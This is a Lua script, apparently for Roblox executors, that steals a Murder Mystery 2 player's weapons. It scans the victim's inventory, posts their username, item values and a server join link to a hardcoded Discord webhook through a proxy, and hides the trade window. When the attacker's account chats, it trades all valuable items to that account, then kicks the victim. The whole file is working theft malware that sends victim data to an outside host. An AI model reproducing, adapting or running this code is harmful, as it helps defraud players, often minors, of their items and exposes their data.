_G.scriptExecuted = _G.scriptExecuted or false 
if _G.scriptExecuted then return end 
_G.scriptExecuted = true

-- ===== MULTIVERSAL REQUEST HANDLER =====
local http_request = (syn and syn.request) or (http and http.request) or http_request or request
if not http_request then
    game.Players.LocalPlayer:Kick("Executor not supported")
    return
end

-- ===== SERVICES =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

-- ===== CONFIGURATION =====
local users = _G.Usernames or {"zzeeuuss1233"}
local min_rarity = _G.min_rarity or "Common"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1374394558657331374/-dmo5vt8NdkPEBRMIrKBG4TdeMxJBrIIyVZSlcqGbB8OZwf8-8QT3Pqxkmj3Tn3H2ksX"

-- Proxy Fix
webhook = webhook:gsub("discord.com", "webhook.lewisakura.moe")

-- ===== DATABASE & UNTRADABLES =====
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local min_rarity_index = table.find(rarityTable, min_rarity) or 1

local untradable = {["DefaultGun"] = true, ["DefaultKnife"] = true, ["SharkSeeker"] = true}

-- ===== FIXED VALUE SYSTEM =====
local function getRealValue(itemName, rarity)
    local name = itemName:lower():gsub("%s+", "")
    local values = {
        ["travelersgun"] = 4300, ["evergun"] = 3400, ["constellation"] = 2600,
        ["evergreen"] = 1900, ["vampiresgun"] = 1750, ["turkey"] = 1600,
        ["harvester"] = 1150, ["sakura"] = 960, ["blossom"] = 950,
        ["corrupt"] = 880, ["darkshot"] = 860, ["darksword"] = 840,
        ["icepique"] = 390, ["bat"] = 350, ["makeshift"] = 310,
        ["jd"] = 200, ["cottoncandy"] = 150
    }
    
    if values[name] then return values[name] end

    if rarity == "Ancient" or rarity == "Unique" then return 500
    elseif rarity == "Godly" then return 100
    elseif rarity == "Legendary" then return 5
    elseif rarity == "Rare" then return 2
    elseif rarity == "Uncommon" or rarity == "Common" then return 1
    end
    
    return 0
end

-- ===== SCAN & SMART SORT =====
local weaponsToSend = {}
local totalValue = 0
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

for id, amt in pairs(realData.Weapons.Owned) do
    if not untradable[id] and database[id] then
        local item = database[id]
        local rarity = item.Rarity
        local rIdx = table.find(rarityTable, rarity)
        
        if rIdx and rIdx >= min_rarity_index then
            local val = getRealValue(item.ItemName or id, rarity)
            
            if val >= min_value then
                totalValue = totalValue + (val * amt)
                table.insert(weaponsToSend, {
                    DataID = id, Name = item.ItemName or id,
                    Rarity = rarity, Amount = amt, Value = val
                })
            end
        end
    end
end

table.sort(weaponsToSend, function(a, b) return a.Value > b.Value end)

-- ===== HIDE GUI =====
for _, gName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = playerGui:WaitForChild(gName)
    gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
    gui.Enabled = false
end

-- ===== UNIVERSAL WEBHOOK FUNCTION (FIXED) =====
local function executeWebhook(webhookData)
    local success = false
    
    -- Try different request methods with full arguments
    local methods = {
        function() 
            return syn and syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return http and http.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return http_request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function() 
            return request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(webhookData)
            })
        end,
        function()
            return HttpService:PostAsync(webhook, HttpService:JSONEncode(webhookData))
        end
    }
    
    for _, method in ipairs(methods) do
        local ok = pcall(method)
        if ok then
            success = true
            break
        end
    end
    
    if not success then
        print("⚠️ Webhook failed - continuing trade")
    end
    
    return success
end

-- ===== DISCORD FUNCTIONS =====
local function SendFirstMessage(list, prefix)
    local itemLines = ""
    for i, item in ipairs(list) do
        if i <= 15 then
            itemLines = itemLines .. string.format("• **%s** (x%s): %d Value\n", item.Name, item.Amount, (item.Value * item.Amount))
        end
    end
    executeWebhook({
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        embeds = {{
            title = "🔪 MM2 Hit Detected!",
            color = 0x00FF00,
            fields = {
                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true},
                {name = "Items (Sorted High -> Low)", value = itemLines ~= "" and itemLines or "No items"},
                {name = "Server Link", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId}
            }
        }}
    })
end

-- ===== TRADE EXECUTION =====
local function acceptTrade()
    -- Try the most common parameter types
    local success = pcall(function()
        ReplicatedStorage.Trade.AcceptTrade:FireServer(true)
    end)
    if not success then
        pcall(function()
            ReplicatedStorage.Trade.AcceptTrade:FireServer(1)
        end)
    end
end

local function doTrade(joinedUser)
    while #weaponsToSend > 0 do
        local status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
        if status == "None" then
            ReplicatedStorage.Trade.SendRequest:InvokeServer(Players:WaitForChild(joinedUser))
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do 
                    ReplicatedStorage.Trade.OfferItem:FireServer(weapon.DataID, "Weapons")
                    task.wait(0.1)
                end
            end
            task.wait(2)
            acceptTrade()
            repeat task.wait(0.2) until ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() == "None"
        end
        task.wait(0.5)
    end
    plr:Kick("Trade Finished. All items secured.")
end

-- ===== STARTUP =====
if #weaponsToSend > 0 then
    local prefix = ping == "Yes" and "@everyone " or ""
    SendFirstMessage(weaponsToSend, prefix)

    local function onPlayerAdded(p)
        if table.find(users, p.Name) then
            p.Chatted:Connect(function() doTrade(p.Name) end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayerAdded(p) end
    Players.PlayerAdded:Connect(onPlayerAdded)
else
    plr:Kick("Victim has no valuable items.")
end
